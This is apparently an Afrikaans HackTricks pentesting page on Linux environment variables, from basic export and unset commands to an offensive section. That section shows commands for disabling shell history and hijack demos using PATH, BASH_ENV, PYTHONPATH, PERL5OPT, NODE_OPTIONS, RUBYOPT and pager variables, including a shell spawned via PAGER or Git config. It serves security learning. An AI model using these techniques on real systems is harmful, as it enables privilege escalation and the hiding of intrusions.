# Linux-omgewingsveranderlikes

{{#include ../../banners/hacktricks-training.md}}

## Globale veranderlikes

Die globale veranderlikes **sal** deur **kinderprosesse** geërf word.

Jy kan ’n globale veranderlike vir jou huidige sessie skep deur:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Hierdie veranderlike sal toeganklik wees vir jou huidige sessies en hul kinderprosesse.

Jy kan 'n veranderlike **verwyder** deur:
```bash
unset MYGLOBAL
```
## Plaaslike veranderlikes

Die **plaaslike veranderlikes** kan slegs deur die **huidige shell/script** **geakses** word.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Lys huidige veranderlikes
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Die inhoud van `/proc/*/environ` is **NUL-geskei**, dus is hierdie variante gewoonlik makliker om te lees:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
As jy op soek is na **credentials** of **interessante dienskonfigurasie** binne geërfde omgewings, kyk ook na [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Algemene veranderlikes

Van: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)

- **DISPLAY** – die display wat deur **X** gebruik word. Hierdie veranderlike word gewoonlik op **:0.0** gestel, wat die eerste display op die huidige rekenaar beteken.
- **EDITOR** – die gebruiker se voorkeurteksredigeerder.
- **HISTFILESIZE** – die maksimum aantal reëls wat in die history-lêer vervat kan wees.
- **HISTSIZE** – die aantal reëls wat by die history-lêer gevoeg word wanneer die gebruiker sy sessie beëindig.
- **HOME** – jou tuisgids.
- **HOSTNAME** – die hostname van die rekenaar.
- **LANG** – jou huidige taal.
- **MAIL** – die ligging van die gebruiker se mail spool. Gewoonlik **/var/spool/mail/USER**.
- **MANPATH** – die lys gidse waarin daar na manual pages gesoek moet word.
- **OSTYPE** – die tipe operating system.
- **PS1** – die verstekprompt in bash.
- **PATH** – stoor die path van al die gidse wat binary files bevat wat jy wil uitvoer deur slegs die naam van die file te spesifiseer, en nie ’n relatiewe of absolute path nie.
- **PWD** – die huidige werkgids.
- **SHELL** – die path na die huidige command shell (byvoorbeeld, **/bin/bash**).
- **TERM** – die huidige terminal type (byvoorbeeld, **xterm**).
- **TZ** – jou tydsone.
- **USER** – jou huidige gebruikersnaam.

## Interessante veranderlikes vir hacking

Nie elke veranderlike is ewe nuttig nie. Vanuit ’n offensiewe perspektief moet veranderlikes wat **search paths**, **startup files**, **dynamic linker behavior** of **audit/logging** verander, voorkeur geniet.

### **HISTFILESIZE**

Verander die **waarde van hierdie veranderlike na 0**, sodat die **history file** (\~/.bash_history) wanneer jy jou **sessie beëindig**, tot **0 reëls** verkort word.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Verander die **waarde van hierdie veranderlike na 0**, sodat opdragte **nie in die geheuegeskiedenis gehou word nie** en nie na die **geskiedenislêer** (\~/.bash_history) geskryf sal word nie.
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

As die **waarde van hierdie veranderlike op `ignorespace` of `ignoreboth` gestel is**, sal enige opdrag wat met ’n ekstra spasie begin, nie in die geskiedenis gestoor word nie.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Stel die **geskiedenislêer** op **`/dev/null`** of stel dit heeltemal ongedefinieerd. Dit is gewoonlik meer betroubaar as om slegs die geskiedenislêergrootte te verander.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Die prosesse sal die **proxy** wat hier verklaar is, gebruik om via **http of https** aan die internet te koppel.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: verstek-proxy vir nutsmiddels/protokolle wat dit ondersteun.
- `no_proxy`: omseilingslys (gashere/domeine/CIDRs) wat direk moet verbind.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Beide kleinletter- en hooflettervariante kan gebruik word, afhangend van die tool (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Die prosesse sal die sertifikate vertrou wat in **hierdie omgewingsveranderlikes** aangedui word. Dit is nuttig om tools soos **`curl`**, **`git`**, Python HTTP-kliënte of pakketbestuurders ’n CA te laat vertrou wat deur die aanvaller beheer word (byvoorbeeld om ’n onderskeppingsproxy legitiem te laat lyk).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

As 'n bevoorregte wrapper/script opdragte **sonder absolute paaie** uitvoer, kry die **eerste aanvaller-beheerde gids** in `PATH` voorrang. Dit is die basiese meganisme agter baie **PATH hijacks** in `sudo`, cron jobs, shell wrappers en pasgemaakte SUID helpers. Soek na `env_keep+=PATH`, 'n swak `secure_path`, of wrappers wat `tar`, `service`, `cp`, `python`, ens. volgens naam aanroep.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Vir volledige privilege-escalation-kettings wat `PATH` misbruik, kyk na [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` is nie net 'n gidsverwysing nie: baie nutsmiddels laai outomaties **dotfiles**, **plugins** en **per-gebruiker-konfigurasie** vanaf `$HOME` of `$XDG_CONFIG_HOME`. Indien 'n bevoorregte workflow hierdie waardes behou, kan **config injection** makliker wees as binary hijacking.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Interessante teikens sluit `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py`, en tool-spesifieke lêers soos `.terraformrc` in.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Hierdie veranderlikes beïnvloed die **dynamic linker**:

- `LD_PRELOAD`: dwing ekstra shared objects af om eerste gelaai te word.
- `LD_LIBRARY_PATH`: plaas library-soekgidse vooraan.
- `LD_AUDIT`: laai auditor libraries wat library-laaiing en symbol resolution waarneem.

Hulle is uiters waardevol vir **hooking**, **instrumentation**, en **privilege escalation** indien ’n privileged command hulle behou. In **secure-execution**-modus (`AT_SECURE`, byvoorbeeld setuid/setgid/capabilities), verwyder of beperk die loader baie van hierdie veranderlikes. Parser-bugs in daardie vroeë loader-stadium het egter steeds ’n groot impak omdat hulle **voor** die target program uitgevoer word.
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` verander vroeë glibc-gedrag (byvoorbeeld allocator-tunables) en is baie handig in exploit-laboratoriums. Dit is ook vanuit ’n sekuriteitsperspektief belangrik omdat die **dynamic loader dit baie vroeg ontleed**. Die 2023 **Looney Tunables**-bug was ’n goeie herinnering dat ’n enkele omgewingsveranderlike wat deur die loader ontleed word, ’n **local privilege-escalation primitive** teen SUID-programme kan word.
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

As **Bash** **nie-interaktief** begin word, kontroleer dit `BASH_ENV` en laai daardie lêer voordat die teikenskrip uitgevoer word. Wanneer Bash as `sh` aangeroep word, of in POSIX-styl-interaktiewe modus, kan `ENV` ook geraadpleeg word. Dit is ’n klassieke manier om ’n shell wrapper in code execution te omskep indien die omgewing deur ’n aanvaller beheer word.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash self deaktiveer hierdie startup files wanneer die **real/effective IDs verskil**, tensy `-p` gebruik word; die presiese gedrag hang dus af van hoe die wrapper die shell aanroep. Wees versigtig met bevoorregte wrappers wat `setuid()`/`setgid()` **voor** die launching van Bash aanroep: sodra die IDs weer ooreenstem, kan Bash `BASH_ENV`, `ENV` en verwante shell state vertrou wat andersins geïgnoreer sou word.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Hierdie variables verander hoe Python begin:

- `PYTHONPATH`: voeg import search paths vooraan by.
- `PYTHONHOME`: verskuif die standard library tree.
- `PYTHONSTARTUP`: voer 'n file uit voor die interactive prompt.
- `PYTHONINSPECT=1`: gaan na interactive mode nadat 'n script voltooi is.

Hulle is nuttig teen maintenance scripts, debuggers, shells en wrappers wat Python met 'n beheerbare environment aanroep. `python -E` en `python -I` ignoreer alle `PYTHON*` variables.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
'n Onlangse werklike voorbeeld was die 2024 **needrestart** LPE op Ubuntu/Debian-stelsels: die root-owned skandeerder het 'n unprivileged proses se `PYTHONPATH` vanaf `/proc/<PID>/environ` gekopieer en toe Python uitgevoer. Die gepubliseerde exploit het `importlib/__init__.so` in die aanvaller-beheerde pad geplaas sodat Python aanvallerkode tydens sy eie initialisering uitgevoer het, voordat die helper se hard-coded script selfs saak gemaak het.

### **PERL5OPT & PERL5LIB**

Perl het soortgelyke nuttige startup-variables:

- `PERL5LIB`: voeg library-gidse vooraan by.
- `PERL5OPT`: inject switches asof hulle op elke `perl`-opdragreël was.

Dit kan **automatic module loading** afdwing of die interpreter se gedrag verander voordat die target script enigiets interessants doen. Perl ignoreer hierdie variables in **taint / setuid / setgid**-kontekste, maar hulle bly baie belangrik vir normale root-run wrappers, CI-jobs, installers en custom sudoers-reëls.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` voeg **Node.js CLI flags** by elke `node`-proses wat die omgewing erf. Dit maak dit nuttig teen wrappers, CI-jobs, Electron helpers en sudo-reëls wat uiteindelik Node aanroep. Die interessantste flags vir aanvallende gebruik is gewoonlik:

- `--require <file>`: laai vooraf 'n CommonJS-lêer voordat die teikenskrip uitgevoer word.
- `--import <module>`: laai vooraf 'n ES-module voordat die teikenskrip uitgevoer word.

Node weier sommige gevaarlike flags in `NODE_OPTIONS`, maar `--require` en `--import` word uitdruklik toegelaat en word **voor** die gewone command-line arguments verwerk.
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
Vir remote gadget chains wat `NODE_OPTIONS` indirek instel (byvoorbeeld prototype-pollution to RCE), kyk na [hierdie ander bladsy](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby bied dieselfde soort misbruik tydens opstart:

- `RUBYLIB`: voeg gidse vooraan Ruby se load path.
- `RUBYOPT`: voeg command-line options soos `-r` by elke `ruby`-invocation.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Die 2024 **needrestart**-kwesbaarhede het gewys dat dit nie net ’n lab-truuk is nie: dieselfde helper wat deur root besit word en kwesbaar was vir `PYTHONPATH`-misbruik, kon ook gedwing word om Ruby met ’n deur die aanvaller beheerde `RUBYLIB` te laat loop, wat `enc/encdb.so` uit ’n aanvallergids laai.

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Sommige tools lees nie bloot ’n pad uit die omgewing nie; hulle gee die waarde aan ’n **shell**, ’n **editor** of ’n **input preprocessor**. Dit maak die volgende veranderlikes besonder interessant wanneer ’n bevoorregte wrapper `git`, `man`, `less` of soortgelyke tekskykers uitvoer:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: kies die pager-opdrag.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: kies die editor-opdrag, dikwels met argumente.
- `LESSOPEN`, `LESSCLOSE`: definieer voor-/naverwerkers wat loop wanneer `less` ’n lêer oopmaak.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git ondersteun ook **env-only config injection** sonder om aan die skyf te raak via `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` en `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Vanuit ’n post-exploitation-perspektief, onthou ook dat geërfde omgewings dikwels **credentials**, **proxy settings**, **service tokens** of **cloud keys** bevat. Kyk na [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) vir `/proc/<PID>/environ` en `systemd` se `Environment=`-jag.

### PS1

Verander hoe jou prompt lyk.

[**Hierdie is ’n voorbeeld**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Hier is ’n voorbeeld](<../images/image (897).png>)

Gewone gebruiker:

![PERL5OPT & PERL5LIB - PS1: Een, twee en drie agtergrond-take](<../images/image (740).png>)

Een, twee en drie agtergrond-take:

![PERL5OPT & PERL5LIB - PS1: Een, twee en drie agtergrond-take](<../images/image (145).png>)

Een agtergrond-taak, een gestopte taak en die laaste opdrag het nie korrek voltooi nie:

![PERL5OPT & PERL5LIB - PS1: Een agtergrond-taak, een gestopte taak en die laaste opdrag het nie korrek voltooi nie](<../images/image (715).png>)

## Verwysings

- [GNU Bash Manual - Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [Qualys - LPEs in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)

{{#include ../../banners/hacktricks-training.md}}
